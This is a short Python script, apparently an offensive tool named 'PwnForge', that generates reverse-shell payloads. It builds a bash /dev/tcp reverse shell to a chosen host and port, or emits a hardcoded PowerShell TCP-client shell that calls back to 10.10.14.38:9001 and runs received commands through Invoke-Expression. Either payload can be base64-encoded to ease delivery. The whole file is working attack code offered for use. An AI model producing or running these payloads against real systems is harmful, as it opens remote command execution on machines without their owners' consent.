import argparse
import base64



asciiart = """
     
    ┏┓     ┏┓        
    ┃┃┓┏┏┏┓┣ ┏┓┏┓┏┓┏┓
    ┣┛┗┻┛┛┗┻ ┗┛┛ ┗┫┗ 
                  ┛  By Zeipher21x

    Make Your RevShell Right                                      
"""
def generate_payload(host, port, use_payload2, encode_base64=False):
    if host and port:
        payload1 = f"/bin/bash -i >& /dev/tcp/{host}/{port} 0>&1;"
        payload2 = '$LHOST = "10.10.14.38"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
        selected_payload = payload2 if use_payload2 else payload1
        
        if encode_base64:
            encoded_payload = base64.b64encode(selected_payload.encode('utf-8')).decode('utf-8')
            return encoded_payload
        else:
            return selected_payload
    else:
        return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    # Adding optional arguments
    parser.add_argument("-i", "--host", help="Specify the host")
    parser.add_argument("-p", "--port", help="Specify the port")
    parser.add_argument("-e", "--encode", action="store_true", help="Encode payload in Base64")
    parser.add_argument("-ps", "--powershell", action="store_true", help="Use the powershell payload")
   
    # Read arguments from the command line
    args = parser.parse_args()
    
    host = args.host
    port = args.port
    encode_base64 = args.encode
    use_payload2 = args.powershell
   

    payload = generate_payload(host, port, use_payload2, encode_base64)

    if payload:
        if encode_base64:
            print(asciiart)
            print("Encoded Payload (Base64):", payload)
        else:
            print(asciiart)
            print("Payload:", payload)                                                                                            
    else:
        print("Please specify both host and port using -i And -p options. Use '--help' for more.")
